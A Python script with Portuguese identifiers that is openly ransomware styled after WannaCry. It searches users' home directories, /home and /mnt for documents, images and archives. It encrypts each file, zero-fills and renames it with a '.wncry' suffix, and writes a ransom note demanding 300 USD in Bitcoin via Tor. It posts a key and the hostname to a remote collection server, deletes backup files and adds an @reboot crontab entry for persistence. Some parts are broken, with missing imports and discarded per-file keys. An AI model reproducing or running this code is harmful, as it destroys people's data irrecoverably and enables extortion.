import os
import sys
import json
import socket
import secrets
import base64
import logging
import datetime
import subprocess
from pathlib import Path
from typing import List, Set, Optional, Iterable

import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def varrer_diretorios() -> List[str]:
    extensoes: Set[str] = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd", ".zip", ".rar",
    }

    home = Path.home()
    diretorios_base: List[Path] = []

    desktop_dirs = [
        home / "Desktop",
        home / "Área de Trabalho",
        home / "Desktop" / "Área de Trabalho",
    ]
    for d in desktop_dirs:
        if d.exists() and d.is_dir():
            diretorios_base.append(d)
            break
    else:
        if (home / "Desktop").exists():
            diretorios_base.append(home / "Desktop")
        elif (home / "Área de Trabalho").exists():
            diretorios_base.append(home / "Área de Trabalho")

    docs = [
        home / "Documents",
        home / "Documentos",
        home / "Documentos_Teste",
    ]
    for d in docs:
        if d.exists() and d.is_dir():
            diretorios_base.append(d)

    imagens = [
        home / "Pictures",
        home / "Imagens",
    ]
    for d in imagens:
        if d.exists() and d.is_dir():
            diretorios_base.append(d)

    downloads = [
        home / "Downloads",
    ]
    for d in downloads:
        if d.exists() and d.is_dir():
            diretorios_base.append(d)

    raizes = [Path("/home"), Path("/mnt")]
    for r in raizes:
        if r.exists() and r.is_dir():
            diretorios_base.append(r)

    diretorios_base = list(dict.fromkeys([d.resolve() for d in diretorios_base if d.exists() and d.is_dir()]))

    encontrados: List[str] = []

    for base in diretorios_base:
        try:
            for raiz, dirs, arquivos in os.walk(base, topdown=True, followlinks=False, onerror=None):
                dirs[:] = [d for d in dirs if not (Path(raiz) / d).is_symlink()]

                for nome in arquivos:
                    try:
                        caminho = Path(raiz) / nome
                        if caminho.is_symlink():
                            continue

                        if caminho.suffix.lower() in extensoes:
                            encontrados.append(str(caminho.resolve()))
                    except (OSError, PermissionError):
                        continue
        except (PermissionError, OSError):
            continue

    return encontrados


def processar_criptografia(caminho_arquivo: str) -> tuple[bytes, bytes]:
    caminho = Path(caminho_arquivo)
    if not caminho.is_file():
        raise ValueError(f"Caminho não é um arquivo válido: {caminho}")

    chave = secrets.token_bytes(32)
    nonce = secrets.token_bytes(12)

    try:
        with open(caminho, "rb") as f:
            dados_originais = f.read()
    except OSError as e:
        raise RuntimeError(f"Erro ao ler o arquivo {caminho}: {e}") from e

    try:
        aesgcm = AESGCM(chave)
        dados_criptografados = aesgcm.encrypt(nonce, dados_originais, associated_data=None)
    except Exception as e:
        raise RuntimeError(f"Erro durante a criptografia AES-GCM para {caminho}: {e}") from e

    caminho_tmp = caminho.with_suffix(".tmp.wncry")
    try:
        with open(caminho_tmp, "wb") as f:
            f.write(dados_criptografados)
    except OSError as e:
        if caminho_tmp.exists():
            try:
                caminho_tmp.unlink()
            except OSError:
                pass
        raise RuntimeError(f"Erro ao escrever arquivo temporário {caminho_tmp}: {e}") from e

    try:
        os.replace(caminho_tmp, caminho)
    except OSError as e:
        try:
            caminho_tmp.unlink()
        except OSError:
            pass
        raise RuntimeError(
            f"Erro ao substituir atômico para {caminho} com {caminho_tmp}: {e}"
        ) from e

    try:
        comprimento = len(dados_criptografados)
        with open(caminho, "r+b") as f:
            zeros = b"\x00" * min(4096, comprimento)
            restante = comprimento
            f.seek(0)
            while restante > 0:
                bloco = zeros if len(zeros) <= restante else zeros[:restante]
                escritos = f.write(bloco)
                if escritos == 0:
                    raise RuntimeError("Escrita de zeros não avançou")
                restante -= escritos
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        try:
            caminho.unlink()
        except OSError:
            pass
        raise RuntimeError(f"Erro durante sobrescrita com zeros para {caminho}: {e}") from e

    caminho_wncry = caminho.with_suffix(caminho.suffix + ".wncry")
    try:
        os.replace(caminho, caminho_wncry)
    except OSError as e:
        raise RuntimeError(f"Erro ao renomear para {caminho_wncry}: {e}") from e

    return chave, nonce


MASTER_KEY_FILE = Path("/tmp/.master.key")


def _validar_chave_mestra(chave_mestra_b64: str) -> bytes:
    try:
        chave = base64.b64decode(chave_mestra_b64, validate=True)
    except Exception as exc:
        raise ValueError("chave_mestra_b64 inválida: não é Base64 válido") from exc

    if len(chave) == 0:
        raise ValueError("chave_mestra_b64 inválida: resultado vazio após decodificação")
    return chave


def _validar_nonce(nonce: str) -> bytes:
    if not isinstance(nonce, str) or len(nonce.strip()) == 0:
        raise ValueError("nonce deve ser uma string não vazia")
    try:
        return nonce.encode("utf-8")
    except Exception as exc:
        raise ValueError("nonce não pode ser codificado em UTF-8") from exc


def _assegurar_permissoes_seguras(caminho: Path) -> None:
    try:
        caminho.chmod(0o600)
    except Exception as exc:
        raise PermissionError(f"não foi possível definir permissões seguras em {caminho}: {exc}") from exc


def gerenciar_chaves(
    chave_mestra_b64: Optional[str] = None,
    nonce: Optional[str] = None,
    remover: bool = False,
) -> dict:
    if remover:
        if not MASTER_KEY_FILE.exists():
            return {
                "operacao": "nenhuma",
                "caminho": str(MASTER_KEY_FILE),
                "mensagem": "arquivo não existe; nada a remover",
            }

        try:
            modo = MASTER_KEY_FILE.stat().st_mode
            if modo & (stat.S_IRWXG | stat.S_IRWXO):
                raise PermissionError(
                    f"remoção bloqueada: {MASTER_KEY_FILE} possui permissões além de 0o600"
                )
        except Exception as exc:
            raise PermissionError(f"não foi possível verificar segurança de {MASTER_KEY_FILE}: {exc}") from exc

        try:
            MASTER_KEY_FILE.unlink(missing_ok=True)
        except Exception as exc:
            raise RuntimeError(f"falha ao remover {MASTER_KEY_FILE}: {exc}") from exc

        return {
            "operacao": "removida",
            "caminho": str(MASTER_KEY_FILE),
            "mensagem": "arquivo removido com sucesso",
        }

    if chave_mestra_b64 is None or nonce is None:
        raise ValueError("chave_mestra_b64 e nonce são obrigatórios para persistência")

    chave = _validar_chave_mestra(chave_mestra_b64)
    valor_nonce = _validar_nonce(nonce)

    try:
        dados = base64.b64encode(chave) + b"|" + base64.b64encode(valor_nonce)

        with tempfile.NamedTemporaryFile(dir=MASTER_KEY_FILE.parent, delete=False) as tmp:
            tmp.write(dados)
            tmp_path = Path(tmp.name)

        try:
            _assegurar_permissoes_seguras(tmp_path)
            tmp_path.replace(MASTER_KEY_FILE)
        except Exception:
            try:
                tmp_path.unlink(missing_ok=True)
            finally:
                raise
    except Exception as exc:
        raise RuntimeError(f"falha ao persistir chave em {MASTER_KEY_FILE}: {exc}") from exc

    return {
        "operacao": "persistida",
        "caminho": str(MASTER_KEY_FILE),
        "mensagem": "chave e nonce persistidos com permissões 0o600",
    }


def _configurar_logger() -> logging.Logger:
    logger = logging.getLogger("artefato_resgate")
    logger.setLevel(logging.INFO)
    if not logger.handlers:
        handler = logging.StreamHandler()
        handler.setFormatter(
            logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", "%Y-%m-%dT%H:%M:%S")
        )
        logger.addHandler(handler)
    return logger


def _obter_endereco_bitcoin_codificado() -> str:
    endereco = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
    return base64.b64encode(endereco.encode()).decode()


def _conteudo_mensagem() -> str:
    btc_codificado = _obter_endereco_bitcoin_codificado()
    return (
        "========================================\n"
        "  NOTIFICAÇÃO DE INDISPONIBILIDADE\n"
        "========================================\n\n"
        "Seus arquivos foram criptografados e estão inacessíveis.\n"
        "NÃO tente modificar, renomear ou mover os arquivos.\n\n"
        "Para recuperá-los, é necessário pagar o resgate de 300 USD.\n\n"
        f"Endereço Bitcoin (codificado): {btc_codificado}\n"
        "  (decodifique em base64 antes de usar na carteira)\n\n"
        "Instruções para pagamento e descriptografia:\n"
        "1. Instale o navegador Tor (torproject.org) em um dispositivo seguro.\n"
        "2. Acesse nosso serviço oculto (.onion) exclusivamente pelo Tor.\n"
        "3. Envie exatamente 300 USD em BTC para o endereço acima.\n"
        "4. Após confirmação na blockchain, forneça seu ID de transação no portal.\n"
        "5. Baixe a ferramenta de descriptografia e execute no sistema afetado.\n\n"
        "AVISO: não modifique este arquivo e não remova esta mensagem.\n"
        "========================================\n"
    )


def gerar_artefato_resgate(diretorios: List[str]) -> None:
    logger = _configurar_logger()
    nome_arquivo = "#_LEIA_ME_WNCRY_#.txt"
    conteudo = _conteudo_mensagem()
    btc_codificado = _obter_endereco_bitcoin_codificado()

    for caminho_raw in diretorios:
        try:
            caminho = Path(caminho_raw).expanduser().resolve(strict=False)

            if not caminho.exists():
                logger.warning("Diretório não existe; criando: %s", caminho)
                caminho.mkdir(parents=True, exist_ok=True)

            if not caminho.is_dir():
                logger.error("Caminho não é um diretório: %s", caminho)
                continue

            teste = caminho / ".escrita_teste_artefato"
            try:
                teste.touch(exist_ok=True)
                teste.unlink(missing_ok=True)
            except OSError as e:
                logger.error("Sem permissão de escrita em %s: %s", caminho, e)
                continue

            destino = caminho / nome_arquivo
            destino.write_text(conteudo, encoding="utf-8")

            registro = {
                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                "evento": "artefato_criado",
                "diretorio": str(caminho),
                "arquivo": str(destino),
                "resgate_usd": 300,
                "bitcoin_codificado": btc_codificado,
                "status": "sucesso",
            }
            logger.info(json.dumps(registro, ensure_ascii=False))

        except Exception as e:
            logger.error(
                "Falha ao processar %s: %s",
                caminho_raw,
                e,
                exc_info=False,
            )
            continue


def transmitir_orquestracao() -> None:
    key_path = "/tmp/.master.key"
    url = "http://10.254.19.191:8080/collect"

    try:
        with open(key_path, "r", encoding="utf-8") as f:
            aes_key = f.read().strip()
    except OSError as e:
        raise RuntimeError(f"Falha ao ler {key_path}: {e}") from e

    payload = {
        "aes_key": aes_key,
        "hostname": socket.gethostname(),
    }

    try:
        response = requests.post(
            url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"},
        )
        response.raise_for_status()
    except requests.RequestException as e:
        raise RuntimeError(f"Falha na comunicação com {url}: {e}") from e

    try:
        os.remove(key_path)
    except OSError as e:
        raise RuntimeError(f"Falha ao remover {key_path} após transmissão: {e}") from e


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger(__name__)

DEFAULT_TARGET_PATHS = [
    Path.home() / ".cache",
    Path.home() / ".local" / "tmp",
    Path("/tmp"),
]

DEFAULT_SUFFIXES: Set[str] = {".bak", ".backup", ".old"}


def _run_cmd(cmd: List[str], check: bool = True) -> subprocess.CompletedProcess:
    logger.debug("Executando comando: %s", " ".join(cmd))
    return subprocess.run(cmd, capture_output=True, text=True, check=check)


def _ler_crontab_atual() -> str:
    try:
        result = _run_cmd(["crontab", "-l"], check=False)
        if result.returncode == 0:
            return result.stdout
        return ""
    except Exception as exc:
        logger.warning("Não foi possível ler crontab atual: %s", exc)
        return ""


def _garantir_entrada_cron(entrada: str) -> None:
    if not entrada.strip():
        raise ValueError("Entrada do cron não pode ser vazia.")

    entrada_normalizada = entrada.strip()
    crontab_atual = _ler_crontab_atual()

    linhas = [ln.rstrip("\n") for ln in crontab_atual.splitlines() if ln.strip()]

    if entrada_normalizada in linhas:
        logger.info("Entrada do cron já existe. Nenhuma alteração necessária.")
        return

    linhas.append(entrada_normalizada)
    novo_crontab = "\n".join(linhas) + "\n"

    proc = subprocess.run(
        ["crontab", "-"],
        input=novo_crontab,
        text=True,
        capture_output=True,
    )
    if proc.returncode != 0:
        raise RuntimeError(
            f"Falha ao atualizar crontab: {proc.stderr.strip() or proc.stdout.strip()}"
        )
    logger.info("Crontab atualizado com sucesso.")


def _deletar_arquivos_residuais(
    caminhos: Iterable[Path],
    sufixos: Set[str],
) -> None:
    for caminho_base in caminhos:
        caminho_base = caminho_base.expanduser().resolve()
        if not caminho_base.exists():
            logger.warning("Caminho inexistente ignorado: %s", caminho_base)
            continue

        if not caminho_base.is_dir():
            logger.warning("Caminho não é um diretório: %s", caminho_base)
            continue

        for raiz, _, arquivos in os.walk(caminho_base, followlinks=False):
            for nome in arquivos:
                try:
                    caminho_arquivo = Path(raiz) / nome
                    if caminho_arquivo.is_symlink():
                        continue
                    if caminho_arquivo.suffix in sufixos:
                        caminho_arquivo.unlink()
                        logger.info("Removido: %s", caminho_arquivo)
                except PermissionError:
                    logger.warning("Permissão negada ao remover: %s", caminho_arquivo)
                except OSError as exc:
                    logger.warning("Erro ao remover %s: %s", caminho_arquivo, exc)


def configurar_persistencia(
    caminhos: Iterable[Path] | None = None,
    sufixos: Set[str] | None = None,
    comando_personalizado: str | None = None,
) -> None:
    caminhos = list(caminhos) if caminhos is not None else list(DEFAULT_TARGET_PATHS)
    sufixos = sufixos if sufixos is not None else DEFAULT_SUFFIXES.copy()

    logger.info("Iniciando manutenção de arquivos residuais...")
    _deletar_arquivos_residuais(caminhos, sufixos)
    logger.info("Manutenção imediata concluída.")

    if comando_personalizado:
        entrada_cron = f"@reboot {comando_personalizado.strip()}"
    else:
        py_cmd = " ".join([sys.executable, __file__, "--persist-only"])
        entrada_cron = f"@reboot {py_cmd}"

    try:
        _garantir_entrada_cron(entrada_cron)
        logger.info("Persistência configurada: %s", entrada_cron)
    except Exception as exc:
        logger.error("Falha ao configurar persistência no crontab: %s", exc)
        raise


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Manutenção de arquivos residuais e persistência via cron.")
    parser.add_argument(
        "--persist-only",
        action="store_true",
        help="Executa apenas a limpeza de residuos (modo cron), sem reconfigurar entrada.",
    )
    args = parser.parse_args()

    if args.persist_only:
        logger.info("Modo cron: executando limpeza de residuos.")
        _deletar_arquivos_residuais(DEFAULT_TARGET_PATHS, DEFAULT_SUFFIXES)
        sys.exit(0)

    arquivos_encontrados = varrer_diretorios()
    logger.info("Arquivos encontrados: %d", len(arquivos_encontrados))

    chaves_nonce: List[tuple[bytes, bytes]] = []
    for arq in arquivos_encontrados:
        try:
            chave, nonce = processar_criptografia(arq)
            chaves_nonce.append((chave, nonce))
        except Exception as e:
            logger.error("Falha ao processar %s: %s", arq, e)

    if chaves_nonce:
        chave_mestra_b64 = base64.b64encode(secrets.token_bytes(32)).decode("ascii")
        nonce_mestre = secrets.token_bytes(12).hex()

        resultado_chaves = gerenciar_chaves(
            chave_mestra_b64=chave_mestra_b64,
            nonce=nonce_mestre,
            remover=False,
        )
        logger.info("Gerenciamento de chaves: %s", resultado_chaves)

        gerar_artefato_resgate([str(Path(p).parent) for p in arquivos_encontrados])

        try:
            transmitir_orquestracao()
            logger.info("Orquestração transmitida com sucesso.")
        except RuntimeError as err:
            logger.error("Falha na transmissão de orquestração: %s", err)

    configurar_persistencia(
        caminhos=[
            Path.home() / ".cache",
            Path.home() / ".local" / "tmp",
            Path("/tmp"),
        ],
        sufixos={".bak", ".backup", ".old"},
    )
    logger.info("Configuração de persistência concluída.")